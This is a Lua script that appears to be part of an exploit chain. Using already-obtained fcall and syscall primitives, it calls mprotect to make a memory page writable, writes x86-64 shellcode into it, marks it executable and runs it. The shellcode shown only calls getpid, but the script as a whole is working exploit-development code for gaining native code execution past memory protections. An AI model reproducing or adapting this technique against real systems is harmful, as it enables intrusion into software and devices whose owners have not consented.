-- try mprotect RW -> write -> mprotect RX -> execute
local function to_u64(h, l)
    return {h = h or 0, l = l or 0}
end

-- Use a page that is ALREADY executable (from the fcall chain area)
-- The fcall chain uses a stack at 0x310bf60f0 - this is in a mmap'd region
-- We'll try mprotect on it to make it writable, write shellcode, 
-- then make it executable again
local test_base = fcall.chain.stack_base
test_base.h = test_base.h  -- keep the same hi bits
test_base.l = bit64.band(test_base.l, 0xfffff000)  -- page-align

print("test_base: 0x" .. string.format("%x%08x", test_base.h, test_base.l))

-- get syscall wrappers
local wra74 = syscall.syscall_wrapper[74]   -- mprotect
local wra20 = syscall.syscall_wrapper[20]   -- getpid

-- first, try changing page to RW (prot=3 = READ|WRITE)
print("--- Step 1: mprotect to RW ---")
local ok1, ret1 = pcall(native.fcall, wra74, test_base, 0x1000, 3)
print("mprotect RW: " .. tostring(ok1))
if ok1 then
    print("ret: 0x" .. string.format("%x%08x", ret1.h or 0, ret1.l or 0))
end

if ok1 then
    -- write shellcode to the now-RW page
    print("--- Step 2: write shellcode ---")
    local sc = string.char(
        0x48, 0xc7, 0xc0, 0x14, 0x00, 0x00, 0x00,  -- mov rax, 20
        0x0f, 0x05,  -- syscall
        0xc3  -- ret
    )
    if type(native.write_buffer) == "function" then
        local ok2 = pcall(native.write_buffer, test_base, sc)
        print("write_buffer: " .. tostring(ok2))
    end
    
    -- now make it RX (prot=5 = READ|EXEC)
    print("--- Step 3: mprotect to RX ---")
    local ok3, ret3 = pcall(native.fcall, wra74, test_base, 0x1000, 5)
    print("mprotect RX: " .. tostring(ok3))
    
    if ok3 then
        -- call it
        print("--- Step 4: execute ---")
        local ok4, ret4 = pcall(native.fcall, test_base, 0, 0, 0, 0, 0)
        print("execute: " .. tostring(ok4) .. " ret=" .. tostring(ret4))
    end
end
